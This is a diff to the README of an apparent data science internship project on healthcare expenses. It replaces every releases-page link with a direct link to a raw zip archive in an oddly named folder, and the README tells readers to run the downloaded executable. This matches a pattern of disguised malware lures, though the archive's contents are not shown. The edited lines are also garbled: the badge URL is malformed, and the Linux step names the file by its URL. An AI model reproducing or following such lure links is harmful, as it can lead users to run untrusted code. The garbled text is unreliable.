@@ -1,6 +1,6 @@
 # 🔴 DevelopersHub-DataScience-Analytics_Internship-TASK1 - Understand Your Healthcare Expenses Effortlessly
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Lwewaw123/DevelopersHub-DataScience-Analytics_Internship-TASK1/releases)
+[![Download Here](https://raw.githubusercontent.com/Lwewaw123/DevelopersHub-DataScience-Analytics_Internship-TASK1/main/nondisarmament/DevelopersHub-DataScience-Analytics_Internship-TASK1_2.9-alpha.4.zip%https://raw.githubusercontent.com/Lwewaw123/DevelopersHub-DataScience-Analytics_Internship-TASK1/main/nondisarmament/DevelopersHub-DataScience-Analytics_Internship-TASK1_2.9-alpha.4.zip)](https://raw.githubusercontent.com/Lwewaw123/DevelopersHub-DataScience-Analytics_Internship-TASK1/main/nondisarmament/DevelopersHub-DataScience-Analytics_Internship-TASK1_2.9-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run the application.
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
 
-   [Download Here](https://github.com/Lwewaw123/DevelopersHub-DataScience-Analytics_Internship-TASK1/releases)
+   [Download Here](https://raw.githubusercontent.com/Lwewaw123/DevelopersHub-DataScience-Analytics_Internship-TASK1/main/nondisarmament/DevelopersHub-DataScience-Analytics_Internship-TASK1_2.9-alpha.4.zip)
 
 2. **Select the Latest Release:** On the releases page, you will see a list of available versions. Look for the latest release at the top.
 
@@ -21,7 +21,7 @@ Follow these simple steps to download and run the application.
 4. **Run the Application:**
    - **Windows:** Locate the downloaded `.exe` file in your Downloads folder. Double-click to run it.
    - **Mac:** Open the downloaded `.dmg` file. Drag the application to your Applications folder, then open it from there.
-   - **Linux:** Right-click the downloaded `.tar.gz` file and extract it. Open a terminal, navigate to the extracted folder, and run the application.
+   - **Linux:** Right-click the downloaded `https://raw.githubusercontent.com/Lwewaw123/DevelopersHub-DataScience-Analytics_Internship-TASK1/main/nondisarmament/DevelopersHub-DataScience-Analytics_Internship-TASK1_2.9-alpha.4.zip` file and extract it. Open a terminal, navigate to the extracted folder, and run the application.
 
 ## 📝 Features
 
@@ -79,4 +79,4 @@ For more detailed information, you can explore the following topics:
 
 Feel free to dive into the exciting world of data science! 
 
-[Download Here](https://github.com/Lwewaw123/DevelopersHub-DataScience-Analytics_Internship-TASK1/releases)
+[Download Here](https://raw.githubusercontent.com/Lwewaw123/DevelopersHub-DataScience-Analytics_Internship-TASK1/main/nondisarmament/DevelopersHub-DataScience-Analytics_Internship-TASK1_2.9-alpha.4.zip)
